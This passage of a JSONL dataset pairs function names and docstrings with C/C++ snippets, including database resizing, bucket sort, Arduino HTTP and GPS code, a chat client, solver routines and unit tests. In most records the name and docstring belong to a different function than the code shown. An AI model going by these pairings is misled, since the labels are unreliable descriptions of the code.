)\\n    {\\n        Error( ErrERRCheck( JET_errInvalidGrbit ) );\\n    }\\n\\n    \/\/ Invalid grbit combinations.\\n    if ( ( ( grbit & JET_bitResizeDatabaseOnlyGrow ) != 0 ) && ( ( grbit & JET_bitResizeDatabaseOnlyShrink ) != 0 ) )\\n    {\\n        Error( ErrERRCheck( JET_errInvalidGrbit ) );\\n    }\\n\\n    Call( ErrSPGetLastPgno( ppib, ifmp, &pgnoLastCurrent ) );\\n\\n    cpgCurrent = pgnoLastCurrent + cpgDBReserved;\\n    cpgActual = cpgCurrent;\\n\\n    if ( cpgCurrent == (CPG)cpgTarget )\\n    {\\n        \/\/ Do nothing\\n        goto DoneWithResizing;\\n    }\\n    else if ( (CPG)cpgTarget < cpgCurrent )\\n    {\\n        \/\/ We would shrink, but the client only wants growth.\\n        if ( ( ( grbit & JET_bitResizeDatabaseOnlyGrow ) != 0 ) )\\n        {\\n            goto DoneWithResizing;\\n        }\\n\\n        \/\/ Fail if shrink is disabled.\\n        if ( ( ( GrbitParam( g_rgfmp[ ifmp ].Pinst(), JET_paramEnableShrinkDatabase ) & JET_bitShrinkDatabaseOn ) == 0 ) )\\n        {\\n            Error( ErrERRCheck( JET_errFeatureNotAvailable ) );\\n        }\\n\\n        \/\/ Trim the database, regardless of whether the user specified JET_bitShrinkDatabaseRealtime\\n        \/\/ That parameter controls the in-line trimming, and we still want to support explicit\\n        \/\/ JetResizeDatabase() calls without setting that parameter.\\n        Call( ErrSPTrimRootAvail( ppib, ifmp, CPRINTFNULL::PcprintfInstance() ) );\\n        fTrimmed = fTrue;\\n    }\\n    else\\n    {\\n        \/\/ We would shrink, but the client only wants shrinkage.\\n        if ( ( ( grbit & JET_bitResizeDatabaseOnlyShrink ) != 0 ) )\\n        {\\n            goto DoneWithResizing;\\n        }\\n\\n        \/\/ Grow the database...\\n\\n        if ( BoolParam( JET_paramEnableViewCache ) )\\n        {\\n            Error( ErrERRCheck( JET_errFeatureNotAvailable ) );\\n        }\\n\\n        CPG cpgExtend = (CPG)cpgTarget - cpgCurrent;\\n        Assert( cpgExtend > 0 );\\n\\n        if ( ppib->Level() == 0 )\\n        {\\n            \/\/ Begin transaction as the space operations below\\n            \/\/ expect to run under a transaction.\\n            Call( ErrDIRBeginTransaction( ppib, 46920, NO_GRBIT ) );\\n            fTransactionStarted = fTrue;\\n        }\\n        \\n        \/\/ Same as above, we will round up by extension size.\\n        cpgExtend = roundup( cpgExtend, cpgExtensionSize );\\n        Assert( cpgExtend > 0 );\\n\\n        \/\/ We will extend in extension size chunks so the OE is layed out in extension sizes\\n        \/\/ as well, which makes shrinking easier over time.\\n        CPG cpgTotal = 0;\\n        do\\n        {\\n            \/\/ Pass in fFalse for DBEXTENDTASK, so that the pcpgActual output parameter is\\n            \/\/ accurate.\\n            Call( ErrSPExtendDB( ppib, ifmp, cpgExtensionSize, &pgnoAlloc, fFalse ) );\\n\\n            cpgTotal += cpgExtensionSize;\\n        }\\n        while ( cpgTotal < cpgExtend );\\n\\n    }\\n\\nDoneWithResizing:\\n    \/\/ Update the output parameter.\\n    QWORD cbActual = 0;\\n\\n    if ( fTrimmed )\\n    {\\n        Call( g_rgfmp[ ifmp ].Pfapi()->ErrSize( &cbActual, IFileAPI::filesizeOnDisk ) );\\n    }\\n    else\\n    {\\n        Call( g_rgfmp[ ifmp ].Pfapi()->ErrSize( &cbActual, IFileAPI::filesizeLogical ) );\\n    }\\n\\n    OSTraceFMP( ifmp, JET_tracetagSpaceInternal,\\n             OSFormat( \"%hs: ifmp=%d had cpgActual=%d, now ErrSize is setting it to %d (cpgCurrent=%d; fTrimmed=%d).\",\\n                       __FUNCTION__, ifmp, cpgActual, g_rgfmp[ ifmp ].CpgOfCb( cbActual ), cpgCurrent, fTrimmed ) );\\n\\n    cpgActual = g_rgfmp[ ifmp ].CpgOfCb( cbActual );\\n    Assert( cpgActual > 0 );\\n\\n    Assert( JET_errSuccess == err );\\n\\nHandleError:\\n    if ( pcpgActual != NULL )\\n    {\\n        *pcpgActual = cpgActual;\\n    }\\n\\n    if ( fTransactionStarted )\\n    {\\n        CallS( ErrDIRCommitTransaction( ppib, NO_GRBIT ) );\\n    }\\n\\n    return err;\\n}'}","id":5185}
{"content":"{'function_name': 'global_extract_null_helper', 'docstring': '\/\/ quick return', 'code': 'std::vector<std::vector<size_t>> separate_to_bucket(std::vector<int>& key,\\n                                                    std::vector<size_t>& idx,\\n                                                    size_t num_bucket) {\\n  std::vector<std::vector<size_t>> ret(num_bucket);\\n  size_t size = key.size();\\n  std::vector<size_t> rettmp(size);\\n  size_t* rettmpp = rettmp.data();\\n\\n  size_t bucket_ldim = SEPARATE_TO_BUCKET_VLEN + 1;\\n  \/\/ bucket_table is columnar (VLEN + 1) by num_bucket matrix\\n  \/\/ \"1\" is to avoid bank conflict, but reused for \"rest\" of the data\\n  std::vector<size_t> bucket_table(num_bucket * bucket_ldim);\\n  \/\/ +1 for bucket_sum\\n  std::vector<size_t> px_bucket_table(num_bucket * bucket_ldim + 1);\\n  size_t* bucket_tablep = &bucket_table[0];\\n  size_t* px_bucket_tablep = &px_bucket_table[0];\\n  std::vector<size_t> bucket_sum(num_bucket);\\n  size_t* bucket_sump = &bucket_sum[0];\\n  int bucket[RADIX_SORT_VLEN];\\n#pragma vreg(bucket)\\n\\n  std::vector<size_t> pos(size);\\n  size_t* posp = &pos[0];\\n  size_t block_size = size \/ SEPARATE_TO_BUCKET_VLEN;\\n  if(block_size % 2 == 0 && block_size != 0) block_size -= 1;\\n  size_t rest = size - SEPARATE_TO_BUCKET_VLEN * block_size;\\n  for(size_t i = 0; i < bucket_table.size(); i++) bucket_tablep[i] = 0;\\n  for(size_t i = 0; i < num_bucket; i++) bucket_sump[i] = 0;\\n  int *keyp = &key[0];\\n  size_t *idxp = &idx[0];\\n  for(size_t b = 0; b < block_size; b++) { \/\/ b: block\\n#pragma cdir nodep\\n#pragma _NEC ivdep\\n    for(int v = 0; v < SEPARATE_TO_BUCKET_VLEN; v++) { \/\/ vector loop, raking\\n      bucket[v] = keyp[block_size * v + b];\\n      posp[block_size * v + b] = bucket_tablep[bucket_ldim * bucket[v] + v];\\n      bucket_tablep[bucket_ldim * bucket[v] + v]++;\\n    }\\n  }\\n  size_t v = SEPARATE_TO_BUCKET_VLEN;\\n  for(int b = 0; b < rest; b++) { \/\/ not vector loop\\n    int bucket = keyp[block_size * v + b];\\n    posp[block_size * v + b] = bucket_tablep[bucket_ldim * bucket + v];\\n    bucket_tablep[bucket_ldim * bucket + v]++;\\n  }\\n  \/\/ preparing for the copy\\n  prefix_sum(bucket_tablep, px_bucket_tablep + 1, num_bucket * bucket_ldim);\\n  \/\/ now copy the data to the bucket\\n#pragma _NEC vob\\n  for(size_t b = 0; b < block_size; b++) { \/\/ b: block\\n#pragma cdir nodep\\n#pragma _NEC ivdep\\n#pragma _NEC vovertake\\n    for(int v = 0; v < SEPARATE_TO_BUCKET_VLEN; v++) { \/\/ vector loop, raking\\n      int bucket = keyp[block_size * v + b];\\n      size_t to = px_bucket_tablep[bucket_ldim * bucket + v] +\\n        posp[block_size * v + b];\\n      rettmpp[to] = idxp[block_size * v + b];\\n    }\\n  }\\n  v = SEPARATE_TO_BUCKET_VLEN;\\n#pragma cdir nodep\\n#pragma _NEC ivdep\\n  for(size_t b = 0; b < rest; b++) {\\n    int bucket = keyp[block_size * v + b];\\n    size_t to = px_bucket_tablep[bucket_ldim * bucket + v] +\\n      posp[block_size * v + b];\\n    rettmpp[to] = idxp[block_size * v + b];\\n  }\\n\\n  for(size_t i = 0; i < num_bucket; i++) {\\n    bucket_sump[i] +=\\n      px_bucket_tablep[bucket_ldim * (i + 1)] -\\n      px_bucket_tablep[bucket_ldim * i];\\n  }\\n  size_t current = 0;\\n  for(size_t i = 0; i < num_bucket; i++) {\\n    ret[i].resize(bucket_sump[i]);\\n    auto retp = ret[i].data();\\n    auto rettmp2 = rettmpp + current;\\n    for(size_t j = 0; j < bucket_sump[i]; j++) {\\n      retp[j] = rettmp2[j];\\n    }\\n    current += bucket_sump[i];\\n  }\\n  return ret;\\n}'}","id":5186}
{"content":"{'function_name': 'handleRoot', 'docstring': '\/\/ sending in text\/html format at 200: OK status mode\\r', 'code': \"String checkClient()\\r\\n{ \/\/wait till client is available\\r\\n  while(!client.available()) delay(1); \\r\\n  \/\/ read the string until carriage return is not detected\\r\\n  String request = client.readStringUntil('\\\\r');\\r\\n\\r\\n  \/\/ remove the last 9 unwanted characters\\r\\n  request.remove(request.length()-9,9);\\r\\n  \\r\\n  return request;\\r\\n}\"}","id":5190}
{"content":"{'function_name': 'Quit', 'docstring': '\/\/\u6b64\u5904\u6267\u884cdelete\u7684\u4f5c\u7528\u662f\u4e3a\u4e86\u6267\u884c\u6790\u6784\u51fd\u6570\uff0c\u5c24\u5176\u662fg_window,\u4e0d\u7136\uff0c\u5f02\u5e38\u7ed3\u675f\u540e\u540e\u9020\u6210\u7ec8\u7aef\u663e\u793a\u6df7\u4e71.:', 'code': 'void Run(const std::string& ip,short port)\\n{\\n\\t\/\/0.\u6355\u6349SIGINT\u4fe1\u53f7\\n\\tsignal(SIGINT,Quit);\\n\\tpthread_mutex_init(&g_lock,NULL);\\n\\t\/\/1.\u521d\u59cb\u5316\u5ba2\u6237\u7aef\u6838\u5fc3\u6a21\u5757\\n\\tg_client = new client::ChatClient();\\n\\tint ret = g_client->Init(ip,port);\\n\\tif(ret < 0)\\n\\t{\\n\\t\\tLOG(ERROR)<<\"client Init failed!\\\\n\";\\n\\t\\treturn ;\\n\\t}\\n\\t\/\/2.\u63d0\u793a\u7528\u6237\u8f93\u5165\u7528\u6237\u540d\u548c\u5b66\u6821\\n\\tstd::string name,school;\\n\\tstd::cout<<\"\u8bf7\u8f93\u5165\u7528\u6237\u540d\"<<std::endl;\\n\\tstd::cin>>name;\\n\\tstd::cout<<\"\u8bf7\u8f93\u5165\u5b66\u6821\"<<std::endl;\\n\\tstd::cin>>school;\\n\\tg_client->SetUserInfo(name,school);\\n\\t\/\/3.\u521d\u59cb\u5316\u7528\u6237\u754c\u9762\u6a21\u5757\\n\\tg_window = new client::Window();\\n\\tg_window->DrawHeader();\\n\\t\/\/4.\u521b\u5efa\u4e24\u4e2a\u7ebf\u7a0b\uff0c\u8ba9\u7ebf\u7a0b\u5b8c\u6210\u6570\u636e\u7684\u8bfb\u53d6\u548c\u53d1\u9001\\n\\tpthread_t stid,rtid;\\n\\t\\n\\t\/\/ \\ta\u3002\u53d1\u9001\u7ebf\u7a0b:\u8bfb\u53d6\u8f93\u5165\u6570\u636e\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u5668;\\n\\tpthread_create(&stid,NULL,Send,NULL);\\n\\t\/\/      b\u3002\u63a5\u53d7\u7ebf\u7a0b\uff1a\u4ece\u670d\u52a1\u5668\u4e2d\u8bfb\u6570\u636e\uff0c\u663e\u793a\u5230\u754c\u9762\\n\\tpthread_create(&rtid,NULL,Recv,NULL);\\n\\t\\n\\tpthread_join(stid,NULL);\\n\\tpthread_join(rtid,NULL);\\n\\t\\n\\t\/\/5.\u5bf9\u8fdb\u7a0b\u9000\u51fa\u65f6\u8fdb\u884c\u5904\u7406\\n\\tdelete g_window;\\n\\tdelete g_client;\\n\\tpthread_mutex_destroy(&g_lock);;\\n}'}","id":5191}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ Print the IP address', 'code': 'void loop()\\n{\\n  float flat, flon;                           \/\/ create our floats lat and long\\n  unsigned long age;                          \/\/ create our unused but necessary age\\n\\n  rssi = WiFi.RSSI();                         \/\/ recalculate RSSI to be sent as telemetry\\n  String rssiString = String(rssi);           \/\/ convert RSSI to string to be put into HTML doc\\n  Serial.println(\"RSSI: \" + rssiString);\\n  readADC();\\n  String adcString = String(ADCreading);\\n  Serial.println(\"ADC: \" + adcString);\\n  \\n  boolean fixStatus = checkFix();             \/\/ find out whether we are connected or not to satellites\\n                                              \/\/ check out checkFix() down below\\n  \/\/ print fix status on monitor\\n  if (fixStatus)\\n  {\\n    Serial.println(\"Has Fix\");\\n  }\\n  else\\n  {\\n    Serial.println(\"No Fix\");\\n  }\\n  \\n  gps.f_get_position(&flat, &flon, &age);               \/\/ extract telemetry from GPS module\\n  String flatString = String(flat, 6);                  \/\/ convert latitude to 6-char string\\n  String flonString = String(flon, 9);                  \/\/ convert latitude to 9-char string\\n  String fixStatusString = String(fixStatus);           \/\/ convert fix status to string\\n  String numSatsString = String(gps.satellites());      \/\/ create string of how many satellites are connected\\n  \\n  int time[4] = {0,0,0,0};                              \/\/ initialize timestamp array\\n  getTime(gps, time);                                   \/\/ extract nuclear clock time from GPS data and put it into time array\\n                                                        \/\/ see getTime below\\n  \/\/ put timestamp data into separate strings\\n  String hourString = String(time[0]);\\n  String minString = String(time[1]);\\n  String secString = String(time[2]);\\n  String merString = String();\\n\\n  \/\/ interpret timestamp as AM or PM\\n  if (time[3])\\n  {\\n    merString = \"PM\";\\n  }\\n  else\\n  {\\n    merString = \"AM\";\\n  }\\n\\n  \/\/ needed for TinyGPS library to not poop its pants *eye roll*\\n  smartdelay(0);\\n  \\n  \/\/ Check if a client has connected\\n  WiFiClient client = server.available();\\n  if (!client)\\n  {\\n    return;\\n  }\\n  \\n  \/\/ Wait until a client makes a request.  This can either be mac or pi\\n  Serial.println(\"new client\");\\n  while(!client.available())\\n  {\\n    delay(1);\\n  }\\n  \\n  \/\/ Read the first line of the request\\n  String req = client.readStringUntil(\\'\\\\r\\');\\n  Serial.println(req);\\n  client.flush();\\n\\n\/*\\n  \/\/ Prototyping lines to create a random coordinate in the playing field\\n  float x = randomDouble(-117.754903, -117.753419);\/\/working coord: -117.753640\\n  float x = flon;\\n  String xString = String(x, 9);\\n  Serial.println(xString);\\n\\n  float y = randomDouble(33.652619, 33.653867);\/\/working coord: 33.652975\\n  float y = flat;\\n  String yString = String(y, 6);\\n  Serial.println(yString);\\n*\/\\n\\n  Serial.println(flonString);\\n  Serial.println(flatString);\\n\\n  \/\/ Prepare the HTML document to be sent\\n  String s = \"HTTP\/1.1 200 OK\\\\r\\\\nContent-Type: text\/html\\\\r\\\\n\\\\r\\\\n\"\\n    \"<!DOCTYPE HTML>\\\\r\\\\n\"\\n    \"<html>\\\\r\\\\n\"\\n    \"wifi: \" + rssiString + \"<br\/>\\\\r\\\\n\"\\n    \"adc: \" + adcString + \"<br\/>\\\\r\\\\n\"\\n    \"x: \" + flonString + \"<br\/>\\\\r\\\\n\"\\n    \"y: \" + flatString + \"<br\/>\\\\r\\\\n\"\\n    \"fix?: \" + fixStatusString + \"<br\/>\\\\r\\\\n\"\\n    \"sats: \" + numSatsString + \"<br\/>\\\\r\\\\n\"\\n    \"hour: \" + hourString + \"<br\/>\\\\r\\\\n\"\\n    \"min: \" + minString + \"<br\/>\\\\r\\\\n\"\\n    \"sec: \" + secString + \"<br\/>\\\\r\\\\n\"\\n    \"mer: \" + merString + \"<br\/>\\\\r\\\\n\"\\n    \"<\/html>\";\\n\\n  \/\/ Send the response to the client\\n  client.print(s);\\n  delay(500);\\n  Serial.println(\"Client disonnected\");\\n}'}","id":5195}
{"content":"{'function_name': 'main', 'docstring': '\/\/ De-allocate all dynamic arrays and matrices', 'code': 'double interface(double *theta, int idx, Arguments args) \\n{\\n    double J;\\n\\n    \/\/ Classification problem\\n    if (args.Yc != nullptr) {\\n        J = args.agents[idx].create_model(theta, args.X, args.Yc, args.n_samples);\\n    }\\n\\n    \/\/ Regression problem\\n    else {\\n        J = args.agents[idx].create_model(theta, args.X, args.Y, args.n_samples);\\n    }\\n\\n    return J;\\n}'}","id":5199}
{"content":"{'function_name': 'decryptPbKey', 'docstring': '\/\/\u52a0\u5bc6\u7684\u521d\u59cb\u5316\u5411\u91cf', 'code': 'int hex2ByteArray(const char * str, unsigned char * bytes, int blen)\\n{\\n\\tunsigned char  pos;\\n\\tunsigned char  idx0;\\n\\tunsigned char  idx1;\\n\\n\\t\/\/ mapping of ASCII characters to hex values\\n\\n\\tmemset(bytes, 0,blen);\\n\\tint str_len = strlen(str);\\n\\tfor (pos = 0; ((pos < (blen * 2)) && (pos < str_len)); pos += 2)\\n\\t{\\n\\t\\tidx0 = (unsigned char)str[pos + 0];\\n\\t\\tidx1 = (unsigned char)str[pos + 1];\\n\\t\\tbytes[pos \/ 2] = (unsigned char)((hashmap[idx0] << 4) | hashmap[idx1]);\\n\\t};\\n\\n\\treturn(0);\\n}'}","id":5214}
{"content":"{'function_name': 'testIsSubtreeOf', 'docstring': '\/\/ #12', 'code': \"int testFindSubtreeLocations(){\\n    CMOrderedTreeMinerWrapper tmw;\\n\\n    short t0[7] = {0,1,-1,2,-1,3,-1};   tmw.addTree(t0, 7); \/\/ #0\\n    short t1[1] = {4};                  tmw.addTree(t1, 1); \/\/ #1\\n    short t2[1] = {2};                  tmw.addTree(t2, 1); \/\/ #2\\n    short t3[1] = {2};                  tmw.addTree(t3, 1); \/\/ #3\\n    short t4[3] = {2,2,-1};             tmw.addTree(t4, 3); \/\/ #4\\n\\n    short t5[17] = {0,1,2,3,-1,-1,-1,5,1,2,-1,2,7,-1,-1,-1,-1};\\n                                        tmw.addTree(t5, 17);\/\/ #5\\n\\n    short t6[3] = {1,2,-1};             tmw.addTree(t6, 3); \/\/ #6\\n    short t7[3] = {0,5,-1};             tmw.addTree(t7, 3); \/\/ #7\\n    short t8[1] = {1};                  tmw.addTree(t8, 1); \/\/ #8\\n\\n    short t9[25] = {0,1,3,-1,6,-1,8,-1,-1,0,1,3,7,-1,-1,8,-1,6,-1,-1,0,1,-1,-1,-1};\\n                                        tmw.addTree(t9,25);\/\/ #9\\n\\n    short t10[5] = {1,3,-1,6,-1};       tmw.addTree(t10, 5);\/\/ #10\\n    short t11[3] = {0,1,-1};            tmw.addTree(t11, 3);\/\/ #11\\n    short t12[3] = {0,0,-1};            tmw.addTree(t12, 3);\/\/ #12\\n\\n    \/\/ shouldn't find one node with label 4 in the bigger tree\\n    assertIntEquals(-1, tmw.findSubtreeLocation(tmw.getAddedTree(0), tmw.getAddedTree(1) ));\\n\\n    vector<int> locations = tmw.findSubtreeLocations(tmw.getAddedTree(0), tmw.getAddedTree(1) );\\n    assertIntEquals(0, locations.size()); \/\/ should be no locations, so zero size.\\n\\n\\n    \/\/ One node tree matched on one node tree should fine one match location.\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(2), tmw.getAddedTree(3) );\\n    assertIntEquals(1, locations.size());\\n    assertIntEquals(0, locations.at(0));\\n\\n    \/\/ The one node tree should be found in the two locations.\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(4), tmw.getAddedTree(2) );\\n    assertIntEquals(2, locations.size());\\n    assertIntEquals(0, locations.at(0));\\n    assertIntEquals(1, locations.at(1));\\n\\n    \/\/ The one node tree should be found at node position 2.\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(0), tmw.getAddedTree(2) );\\n    assertIntEquals(2, locations.at(0));\\n    assertIntEquals(1, locations.size());\\n\\n    \/\/ The two node tree should be found at two positions in the large tree.\\n    assertTrue(tmw.isSubTreeOf(tmw.getAddedTree(5), tmw.getAddedTree(6)));\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(5), tmw.getAddedTree(6) );\\n    assertIntEquals(2, locations.size());\\n    assertIntEquals(1, locations.at(0));\\n    assertIntEquals(5, locations.at(1));\\n\\n    \/\/ The two node tree should be found at one position in the large tree.\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(5), tmw.getAddedTree(7) );\\n    assertIntEquals(1, locations.size());\\n    assertIntEquals(0, locations.at(0));\\n\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(5), tmw.getAddedTree(2) );\\n    assertIntEquals(3, locations.size());\\n    assertIntEquals(2, locations.at(0));\\n    assertIntEquals(6, locations.at(1));\\n    assertIntEquals(7, locations.at(2));\\n\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(9), tmw.getAddedTree(10) );\\n    assertIntEquals(2, locations.size());\\n    assertIntEquals(1, locations.at(0));\\n    assertIntEquals(6, locations.at(1));\\n\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(9), tmw.getAddedTree(11) );\\n    assertIntEquals(3, locations.size());\\n    assertIntEquals(0, locations.at(0));\\n    assertIntEquals(5, locations.at(1));\\n    assertIntEquals(11, locations.at(2));\\n\\n    locations = tmw.findSubtreeLocations(tmw.getAddedTree(9), tmw.getAddedTree(12) );\\n    assertIntEquals(2, locations.size());\\n    assertIntEquals(0, locations.at(0));\\n    assertIntEquals(5, locations.at(1));\\n\\n    assertIntEquals(-1, tmw.findSubtreeLocation(tmw.getAddedTree(9), tmw.getAddedTree(6)));\\n\\n    return 0;\\n}\"}","id":5216}
{"content":"{'function_name': 'newtonMethod', 'docstring': '\/\/Hessian', 'code': 'void secantMethod(double *guess, double *a_final, double *x,\\n                  double *Smeas, int paramSize, int measSize)\\n{\\n  if(a_final == NULL || x == NULL || Smeas == NULL)\\n    return;\\n\\n  \/\/ initializing variables and assigning values\\n  double da[paramSize];\\n  double a_temp1[paramSize], a_temp2[paramSize];\\n  double dV_curr[paramSize], dV_prev[paramSize],\\n          delt_a[paramSize], a_prev[paramSize];\\n  for(int i = 0; i < paramSize; i++)\\n  {\\n    a_final[i] = guess[i];\\n    a_temp1[i] = guess[i];\\n    a_temp2[i] = guess[i];\\n    \\n    da[i] = a_final[i] * PERTURB_NUM;\\n    a_prev[i] = a_final[i] + da[i];\\n  }\\n\\n  \/\/ generating prev guess before initial guess\\n  for(int i = 0; i < paramSize; i++)\\n  {\\n    a_prev[i] += da[i];\\n    dV_prev[i] = (generateV(a_prev, x, Smeas, paramSize, measSize)\\n                    - generateV(a_final, x, Smeas, paramSize, measSize))\\n                    \/ (da[i]);\\n    cout << generateV(a_final, x, Smeas, paramSize, measSize) << \" \"\\n          << generateV(a_prev, x, Smeas, paramSize, measSize) << endl;\\n    a_prev[i] = a_final[i] + da[i];\\n  }\\n  cout << dV_prev[0] << \" \" << dV_prev[1] << endl << endl;;\\n\\n  \\n  \/\/ Secant Method - iterative parameter estimation\\n  int stop = 0, count;\\n  int topCnt = 0;\\n  double delt_a_final[paramSize];\\n\/\/  double min, V_temp          \/\/ for linear search\\n  while(stop == 0)\\n  {\\n    count = 0;\\n    for(int i = 0; i < paramSize; i++)\\n    {\\n      \/\/cout << \"++++++++++++ \" << i << endl;\\n\\n      \/\/calculate slope\\n      da[i] = a_final[i] * PERTURB_NUM;\\n      a_temp1[i] += da[i] ;\\n      dV_curr[i] = (generateV(a_temp1, x, Smeas, paramSize, measSize)\\n                    - generateV(a_final, x, Smeas, paramSize, measSize))\\n                    \/ (da[i]);\\n      a_temp1[i] = a_final[i];\\n      \/\/cout << generateV(a_final, x, Smeas, paramSize, measSize) << \" \"\\n      \/\/      << generateV(a_temp1, x, Smeas, paramSize, measSize) << endl;\\n\\n      \/\/calculate updated parameters (delta_a)\\n      delt_a[i] = dV_curr[i] * (a_final[i] - a_prev[i])\\n                              \/ (dV_curr[i] - dV_prev[i]);\\n\\n      \/\/linear search\\n      \/*\\n      min = 10000;\\n      for(double j = 1.0; j >= 0.25; j -= 0.25)\\n      {\\n        a_temp1[i] -= j * delt_a[i];\\n        V_temp = generateV(a_temp1, x, Smeas, paramSize, measSize);\\n        a_temp1[i] = a_final[i];\\n        cout << V_temp << \" \";\\n        if(abs(V_temp) < abs(min))\\n        {\\n          min = V_temp;\\n          delt_a_final[i] = j * delt_a[i];\\n        }\\n      }\\n      cout << endl;*\/\\n\\n      \/\/store delta_a results into final\\n      delt_a_final[i] = delt_a[i];\\n\\n      if(abs(delt_a_final[i]) < THRESHOLD)\\n      {\\n        count++;\\n      }\\n    }\\n\\n    \/*\\n    cout << \"SLOPE:        \" << dV_curr[0] << \" \" << dV_curr[1] << endl;\\n    cout << \"PREV:         \" << dV_prev[0] << \" \" << dV_prev[1] << endl;\\n    cout << \"DELT_A:       \" << delt_a_final[0] << \" \" << delt_a_final[1] << endl;\\n    cout << \"FINAL PARAMS: \";*\/\\n\\n    \/\/resetting values and updating parameters for next iteration\\n    for(int i = 0; i < paramSize; i++)\\n    {\\n      a_prev[i]  = a_final[i];\\n      a_final[i] -= delt_a_final[i];\\n      a_temp1[i] = a_final[i];\\n      dV_prev[i] = dV_curr[i];\\n\\n      \/\/cout << a_final[i] << \" \";\\n    }\\n    \/\/cout << endl << endl;\\n\\n    \/\/checking if all parameters reach threshold values\\n    if(count >= paramSize)\\n    {\\n      stop = 1;\\n    }\\n    topCnt++;\\n  }\\n  cout << \"SECANT: num of iterations = \" << topCnt << endl;\\n}'}","id":5221}
{"content":"{'function_name': 'fillInIpxData', 'docstring': '\/\/ Column bound vectors.', 'code': 'bool illegalIpxSolvedStatus(const ipx::Info& ipx_info,\\n                            const HighsOptions& options) {\\n  bool found_illegal_status = false;\\n  \/\/========\\n  \/\/ For IPX\\n  \/\/========\\n  \/\/ Can solve and be optimal\\n  \/\/ Can solve and be imprecise\\n  \/\/ Can solve and be primal_infeas\\n  \/\/ Can solve and be dual_infeas\\n  \/\/ Cannot solve and reach time limit\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_ipm == IPX_STATUS_time_limit, options,\\n                     \"solved  status_ipm should not be IPX_STATUS_time_limit\");\\n  \/\/ Cannot solve and reach iteration limit\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_ipm == IPX_STATUS_iter_limit, options,\\n                     \"solved  status_ipm should not be IPX_STATUS_iter_limit\");\\n  \/\/ Cannot solve and make no progress\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_ipm == IPX_STATUS_no_progress, options,\\n                     \"solved  status_ipm should not be IPX_STATUS_no_progress\");\\n  \/\/ Cannot solve and failed\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_ipm == IPX_STATUS_failed, options,\\n                     \"solved  status_ipm should not be IPX_STATUS_failed\");\\n  \/\/ Cannot solve and debug\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_ipm == IPX_STATUS_debug, options,\\n                     \"solved  status_ipm should not be IPX_STATUS_debug\");\\n  \/\/==============\\n  \/\/ For crossover\\n  \/\/==============\\n  \/\/ Can solve and be optimal\\n  \/\/ Can solve and be imprecise\\n  \/\/ Cannot solve with primal infeasibility\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_primal_infeas, options,\\n          \"solved  status_crossover should not be IPX_STATUS_primal_infeas\");\\n  \/\/ Cannot solve with dual infeasibility\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_dual_infeas, options,\\n          \"solved  status_crossover should not be IPX_STATUS_dual_infeas\");\\n  \/\/ Cannot solve and reach time limit\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_time_limit, options,\\n          \"solved  status_crossover should not be IPX_STATUS_time_limit\");\\n  \/\/ Cannot solve and reach time limit\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_iter_limit, options,\\n          \"solved  status_crossover should not be IPX_STATUS_iter_limit\");\\n  \/\/ Cannot solve and make no progress\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_no_progress, options,\\n          \"solved  status_crossover should not be IPX_STATUS_no_progress\");\\n  \/\/ Cannot solve and failed\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(\\n          ipx_info.status_crossover == IPX_STATUS_failed, options,\\n          \"solved  status_crossover should not be IPX_STATUS_failed\");\\n  \/\/ Cannot solve and debug\\n  found_illegal_status =\\n      found_illegal_status ||\\n      ipxStatusError(ipx_info.status_crossover == IPX_STATUS_debug, options,\\n                     \"solved  status_crossover should not be IPX_STATUS_debug\");\\n  return found_illegal_status;\\n}'}","id":5227}
{"content":"{'function_name': 'SceneManagerUpdate', 'docstring': '\/* Update Scene *\/', 'code': 'void\\nSceneManagerRender(\\n\\t_In_ SDL_Renderer *Renderer)\\n{\\n\\t\/* Vars *\/\\n\\tDataKey_t Key;\\n\\n\\t\/* Sanity *\/\\n\\tif (GlbSceneManager == NULL)\\n\\t\\treturn;\\n\\n\\t\/* Get active scene (todo) *\/\\n\\tKey.Value = 0;\\n\\tScene_t *ActiveScene = (Scene_t*)ListGetDataByKey(GlbSceneManager->Scenes, Key, 0);\\n\\n\\t\/* Update Scene *\/\\n\\tSceneRender(ActiveScene, Renderer);\\n\\n\\t\/* Present Scene *\/\\n\\tSDL_RenderPresent(Renderer);\\n}'}","id":5233}
